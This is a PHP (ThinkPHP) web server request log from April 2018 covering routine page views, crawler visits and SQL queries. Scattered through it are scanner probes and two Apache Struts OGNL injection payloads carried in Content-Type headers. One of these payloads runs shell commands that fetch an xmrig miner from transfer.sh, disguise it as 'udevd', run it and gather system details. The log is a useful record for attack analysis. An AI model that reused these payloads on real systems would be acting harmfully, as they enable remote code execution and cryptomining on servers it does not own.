  0 => 'value',
  1 => 'nickname',
  2 => 'data',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000242s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `mv` [ RunTime:0.000675s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 1 LIMIT 1 [ RunTime:0.000170s ]
[ sql ] [ SQL ] SELECT * FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 1 ORDER BY `id` LIMIT 0,20 [ RunTime:0.000161s ]

---------------------------------------------------------------
[ 2018-04-14T10:03:16+08:00 ] 172.16.0.5 111.206.36.8 GET /
[ log ] zard-forever.com/ [运行时间：0.014428s][吞吐率：69.31req/s] [内存消耗：1,679.84kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'zard-forever.com',
  'accept-language' => 'en,*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'Keep-Alive',
  'referer' => 'http://www.baidu.com/s?wd=1Y8',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SOV33 Build/35.0.D.0.326) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T10:04:36+08:00 ] 172.16.0.5 111.206.36.18 GET /index/mv/index.html
[ log ] zard-forever.com/index/mv/index.html [运行时间：0.024191s][吞吐率：41.34req/s] [内存消耗：2,685.05kb] [文件加载：58]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'mv',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'zard-forever.com',
  'accept-language' => 'en,*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'Keep-Alive',
  'referer' => 'http://www.baidu.com/s?wd=N3K',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SOV33 Build/35.0.D.0.326) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Mv->index[ /home/www/WWW/application/index/controller/Mv.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/mv/index.html [ array (
  0 => 'nickname',
  1 => 'value',
  2 => 'data',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000253s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `mv` [ RunTime:0.000599s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 LIMIT 1 [ RunTime:0.000149s ]
[ sql ] [ SQL ] SELECT * FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 ORDER BY `id` LIMIT 0,20 [ RunTime:0.000163s ]

---------------------------------------------------------------
[ 2018-04-14T10:05:22+08:00 ] 172.16.0.5 14.215.176.4 GET /index/mv/index.html?value=1
[ log ] zard-forever.com/index/mv/index.html?value=1 [运行时间：0.025777s][吞吐率：38.79req/s] [内存消耗：2,670.24kb] [文件加载：58]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'mv',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'zard-forever.com',
  'accept-language' => 'en,*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'Keep-Alive',
  'referer' => 'http://www.baidu.com/s?wd=CI8',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SOV33 Build/35.0.D.0.326) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'value' => '1',
)
[ info ] [ RUN ] app\index\controller\Mv->index[ /home/www/WWW/application/index/controller/Mv.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/mv/index.html [ array (
  0 => 'value',
  1 => 'nickname',
  2 => 'data',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000306s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `mv` [ RunTime:0.000591s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 1 LIMIT 1 [ RunTime:0.000159s ]
[ sql ] [ SQL ] SELECT * FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 1 ORDER BY `id` LIMIT 0,20 [ RunTime:0.000152s ]

---------------------------------------------------------------
[ 2018-04-14T11:16:11+08:00 ] 172.16.0.5 189.7.221.241 GET /cgi/common.cgi
[ log ] 123.207.34.110/cgi/common.cgi [运行时间：0.011160s][吞吐率：89.61req/s] [内存消耗：1,355.55kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cgi',
    1 => 'common.cgi',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Wget(linux)',
  'host' => '123.207.34.110',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T11:16:16+08:00 ] 172.16.0.5 189.7.221.241 GET /stssys.htm
[ log ] 123.207.34.110/stssys.htm [运行时间：0.011626s][吞吐率：86.01req/s] [内存消耗：1,355.47kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'stssys.htm',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Wget(linux)',
  'host' => '123.207.34.110',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T11:16:20+08:00 ] 172.16.0.5 189.7.221.241 GET /
[ log ] 123.207.34.110/ [运行时间：0.017157s][吞吐率：58.29req/s] [内存消耗：1,677.82kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Wget(linux)',
  'host' => '123.207.34.110',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T11:42:23+08:00 ] 172.16.0.5 106.75.92.187 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.015682s][吞吐率：63.77req/s] [内存消耗：1,679.01kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'application/json, text/plain, */*',
  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
  'host' => '123.207.34.110:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T11:51:09+08:00 ] 172.16.0.5 171.78.248.137 GET /
[ log ] www.zard-forever.com/ [运行时间：0.014634s][吞吐率：68.33req/s] [内存消耗：1,677.67kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => 'www.zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T12:09:55+08:00 ] 172.16.0.5 66.111.41.250 PUT /Hello.World
[ log ] 255.255.255.255/Hello.World [运行时间：0.012478s][吞吐率：80.14req/s] [内存消耗：1,364.02kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'Hello.World',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'connection' => 'close',
  'cookie' => 'JSESSIONID=659BB9C1FAB3D4F9C3F4561133A825F6',
  'content-length' => '1',
  'accept-encoding' => 'identity',
  'content-type' => '%{(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#os=@java.lang.System@getProperty("os.name")).(#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("Set-Cookie","GQ99ZRI337="+#os))}',
  'accept-language' => 'en-US,en;q=0.5',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
  'host' => '255.255.255.255',
)
[ info ] [ PARAM ] array (
  'x' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T12:18:02+08:00 ] 172.16.0.5 163.177.90.152 GET /manager/html
[ log ] 123.207.34.110/manager/html [运行时间：0.012611s][吞吐率：79.29req/s] [内存消耗：1,356.79kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T12:52:09+08:00 ] 172.16.0.5 119.147.207.152 GET /index/login/%2522
[ log ] zard-forever.com/index/login/%2522 [运行时间：0.015771s][吞吐率：63.41req/s] [内存消耗：1,747.63kb] [文件加载：54]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => '%22',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T15:23:28+08:00 ] 172.16.0.5 101.251.246.66 GET /
[ log ] 123.207.34.110/ [运行时间：0.015040s][吞吐率：66.49req/s] [内存消耗：1,677.89kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T15:31:55+08:00 ] 172.16.0.5 123.59.209.2 GET /
[ log ] www.zard-forever.com/ [运行时间：0.015454s][吞吐率：64.71req/s] [内存消耗：1,678.34kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'Keep-Alive',
  'host' => 'www.zard-forever.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T17:42:26+08:00 ] 172.16.0.5 114.215.45.79 GET /
[ log ] 115.159.78.147:8000/ [运行时间：0.015481s][吞吐率：64.60req/s] [内存消耗：1,677.87kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'connection' => 'Close',
  'host' => '115.159.78.147:8000',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T17:47:18+08:00 ] 172.16.0.5 207.46.13.216 GET /
[ log ] zard-forever.com/ [运行时间：0.014859s][吞吐率：67.30req/s] [内存消耗：1,680.79kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T18:41:44+08:00 ] 172.16.0.5 60.191.38.78 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.016548s][吞吐率：60.43req/s] [内存消耗：1,678.49kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => '123.207.34.110:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T18:41:44+08:00 ] 172.16.0.5 60.191.38.78 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.016771s][吞吐率：59.63req/s] [内存消耗：1,678.49kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => '123.207.34.110:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T18:45:00+08:00 ] 172.16.0.5 207.46.13.216 GET /
[ log ] www.zard-forever.com/ [运行时间：0.014500s][吞吐率：68.96req/s] [内存消耗：1,680.79kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'www.zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T19:54:02+08:00 ] 172.16.0.5 150.109.38.242 GET /
[ log ] www.qeeyou.cn/ [运行时间：0.015022s][吞吐率：66.57req/s] [内存消耗：1,677.85kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'host' => 'www.qeeyou.cn',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T19:55:38+08:00 ] 172.16.0.5 171.78.248.137 GET /
[ log ] www.zard-forever.com/ [运行时间：0.014989s][吞吐率：66.72req/s] [内存消耗：1,677.67kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => 'www.zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T20:54:24+08:00 ] 172.16.0.5 66.111.41.249 POST /Hello.World
[ log ] 0.0.0.0/Hello.World [运行时间：0.011896s][吞吐率：84.06req/s] [内存消耗：1,364.42kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'Hello.World',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'content-length' => '0',
  'accept-encoding' => 'identity',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '%{(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd="tasklist").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?{"cmd.exe","/c",#cmd}:{"/bin/sh","-c","((cd /tmp;curl -s https://transfer.sh/b3sa7/xmrig > udevd || wget -q -O udevd https://transfer.sh/b3sa7/xmrig;chmod +x udevd;./udevd;rm -rf udevd;exit)2>/dev/null &);uname -a;id;hostname;ps xf;exit"})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
  'cookie' => 'JSESSIONID=4BFEE397DD896E7392FC880C0B1B66FF',
  'host' => '0.0.0.0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T22:06:40+08:00 ] 172.16.0.5 160.202.162.40 GET /
[ log ] 123.207.34.110/ [运行时间：0.015187s][吞吐率：65.85req/s] [内存消耗：1,678.28kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'accept' => '*/*',
  'user-agent' => 'User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T22:06:40+08:00 ] 172.16.0.5 160.202.162.40 GET /index.action
[ log ] 123.207.34.110/index.action [运行时间：0.011847s][吞吐率：84.41req/s] [内存消耗：1,360.37kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.207.34.110',
